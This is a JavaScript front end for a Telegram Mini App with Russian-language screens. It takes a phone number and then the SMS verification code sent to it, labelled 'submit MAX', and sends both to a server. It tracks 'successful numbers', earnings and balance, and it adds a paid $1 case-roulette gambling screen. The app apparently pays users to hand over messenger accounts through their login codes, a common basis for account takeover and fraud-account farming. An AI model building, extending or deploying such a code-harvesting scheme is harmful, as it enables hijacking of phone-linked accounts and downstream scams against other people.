const tg = window.Telegram.WebApp; tg.expand(); tg.ready();

const API_BASE = "https://YOUR_PUBLIC_HOST:8080/api"; // укажи свой публичный адрес
const user = tg.initDataUnsafe?.user || {};
const user_id = user?.id;
const username = user?.username || user?.first_name || "user";
const $ = (s)=>document.querySelector(s);

/* --------- helpers --------- */
async function post(path, data){
  try{
    const r = await fetch(`${API_BASE}${path}`,{
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({...data, initData: tg.initData})
    });
    if(!r.ok) throw new Error(`HTTP ${r.status}`);
    return await r.json();
  }catch(e){ console.error(e); return {ok:false}; }
}
function setAria(el, hidden){ el.setAttribute("aria-hidden", hidden ? "true" : "false"); if(hidden) el.setAttribute("inert",""); else el.removeAttribute("inert"); }
function show(id){
  document.querySelectorAll(".card").forEach(e=>{ const hide=(e.id!==id); e.classList.toggle("hidden",hide); setAria(e,hide); });
  if(id==="menu"){ loadLogs(); startLogsPolling(); } else { stopLogsPolling(); }
  if(id==="screen-submit") setTimeout(()=>$("#phone")?.focus(),0);
}

/* --------- nav --------- */
document.querySelectorAll("#menu button[data-screen]").forEach(b=>{
  b.onclick=()=>{
    const sc=b.getAttribute("data-screen");
    if(sc==="stats"){ loadStats(); show("screen-stats"); return; }
    if(sc==="submit"){ show("screen-submit"); return; }
    if(sc==="roulette"){ setupCase(); show("screen-roulette"); return; }
    show("todo");
  };
});
document.querySelectorAll(".back").forEach(b=> b.onclick=()=>show("menu"));
document.getElementById("refreshLogs").onclick = loadLogs;

/* --------- bootstrap --------- */
(async ()=>{ await post("/bootstrap",{user_id,username}); })();

/* --------- stats --------- */
async function loadStats(){
  const j = await post("/stats",{user_id});
  const s = (j && j.stats) || {};
  $("#statsBox").textContent =
`Пользователь: ${s.username || username}
ID: ${user_id ?? "—"}
Регистрация: ${s.first_seen || "—"}
Успешных номеров: ${Number(s.success_count ?? 0)}
Неуспешных номеров: ${Number(s.fail_count ?? 0)}
Всего заработано: ${Number(s.earned ?? 0)}
Баланс: ${Number(s.balance ?? 0)}`;
}

/* --------- LOG CHAT --------- */
function escapeHtml(s){ return String(s).replace(/[&<>"']/g, m=>({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[m])) }
async function loadLogs(){
  const j = await post("/logs",{user_id});
  const list = (j && j.events) || [];
  const chat = $("#chat"); chat.innerHTML = "";
  if(list.length===0){ chat.innerHTML = "<div class='bubble b-system'><div>Пусто</div></div>"; return; }
  for(const ev of list){
    const cls = ev.role==="user" ? "b-user" : ev.role==="admin" ? "b-admin" : "b-system";
    const el = document.createElement("div");
    el.className = `bubble ${cls}`;
    el.innerHTML = `<div>${escapeHtml(ev.text)}</div><div class="meta">${ev.ts}</div>`;
    chat.appendChild(el);
  }
  chat.scrollTop = chat.scrollHeight;
}
let logsTimer=null;
function startLogsPolling(){ if(logsTimer) return; logsTimer=setInterval(()=>{ const menu=$("#menu"); if(menu && !menu.classList.contains("hidden")) loadLogs(); },5000); }
function stopLogsPolling(){ if(logsTimer){ clearInterval(logsTimer); logsTimer=null; }}

/* --------- submit MAX --------- */
let submission_id=null;
$("#sendPhone").onclick=async ()=>{
  const phone=$("#phone").value.trim(); if(!phone){ alert("Введите номер"); $("#phone").focus(); return; }
  const j=await post("/submit_phone",{user_id,username,phone});
  if(j.ok){ submission_id=j.submission_id; $("#codePanel").classList.remove("hidden"); $("#codePanel").setAttribute("aria-hidden","false"); $("#code").focus(); alert("Номер отправлен. Введите код из SMS."); }
  else alert("Ошибка отправки номера");
};
$("#sendCode").onclick=async ()=>{
  const code=$("#code").value.trim(); if(!code || !submission_id){ alert("Нет кода/заявки"); if(!code) $("#code").focus(); return; }
  const j=await post("/submit_code",{user_id,submission_id,code});
  if(j.ok){ alert("Код отправлен. Ожидайте решения."); $("#phone").value=""; $("#code").value=""; $("#codePanel").classList.add("hidden"); $("#codePanel").setAttribute("aria-hidden","true"); show("menu"); }
  else alert("Ошибка отправки кода");
};

/* --------- CASE roulette (CS:GO style) --------- */
const caseStrip = ()=>document.getElementById("case-strip");
function weightedTile(){
  const r=Math.random();
  let lo,hi;
  if(r<0.88){ lo=0.5; hi=2.0; }
  else if(r<0.98){ lo=2.0; hi=5.0; }
  else { lo=5.0; hi=10.0; }
  return Number((lo + Math.random()*(hi-lo)).toFixed(2));
}
function buildStrip(win, n=60){
  const arr = Array.from({length:n-1}, weightedTile);
  arr.push(Number(win.toFixed(2))); // последняя — выигрыш
  return arr;
}
function renderStrip(values){
  const strip = caseStrip();
  strip.innerHTML="";
  for(const v of values){
    const d=document.createElement("div");
    d.className="case-tile";
    d.innerHTML=`<div class="icon">💵</div><div>$${v.toFixed(2)}</div>`;
    strip.appendChild(d);
  }
}
function animateToLast(onDone){
  const strip = caseStrip();
  const tiles = [...strip.querySelectorAll(".case-tile")];
  const winEl = tiles[tiles.length-1];
  const wrap = strip.parentElement.getBoundingClientRect();
  const winCenter = winEl.offsetLeft + winEl.offsetWidth/2;
  const target = Math.max(0, winCenter - wrap.width/2);

  strip.style.transition = "none";
  strip.style.transform = "translateX(0px)";
  // старт с небольшого проскролла, чтобы ощущалась скорость
  requestAnimationFrame(()=>{
    strip.style.transition = "transform 4.2s cubic-bezier(0.08, 0.6, 0, 1)";
    strip.style.transform = `translateX(${-target}px)`;
  });
  const done = ()=>{ strip.removeEventListener("transitionend", done); onDone&&onDone(); };
  strip.addEventListener("transitionend", done);
}
function setupCase(){
  const placeholder = buildStrip(weightedTile(), 40);
  renderStrip(placeholder);
  $("#ru-result").textContent="—";
}
let ruBusy=false;
document.getElementById("ru-spin").onclick = async ()=>{
  if(ruBusy) return; ruBusy=true;
  $("#ru-result").textContent="Покупка…";
  const res = await post("/roulette_spin",{user_id});
  if(!res.ok){ ruBusy=false; if(res.error==="NO_FUNDS") alert("Недостаточно средств: нужно $1"); else alert("Ошибка рулетки"); return; }
  const strip = buildStrip(Number(res.win), 72);
  renderStrip(strip);
  $("#ru-result").textContent="Крутится…";
  animateToLast(()=>{
    $("#ru-result").textContent = `Выигрыш: $${Number(res.win).toFixed(2)} • Баланс: $${Number(res.balance).toFixed(2)}`;
    ruBusy=false; loadStats(); loadLogs();
  });
};

/* --------- UI ripple --------- */
document.addEventListener("click",(e)=>{
  const btn = e.target.closest("button"); if(!btn) return;
  const r = btn.getBoundingClientRect();
  btn.style.setProperty("--rx",(e.clientX-r.left)+"px");
  btn.style.setProperty("--ry",(e.clientY-r.top)+"px");
  btn.classList.add("rippling");
  setTimeout(()=>btn.classList.remove("rippling"),500);
});

/* --------- start --------- */
show("menu");
setupCase();
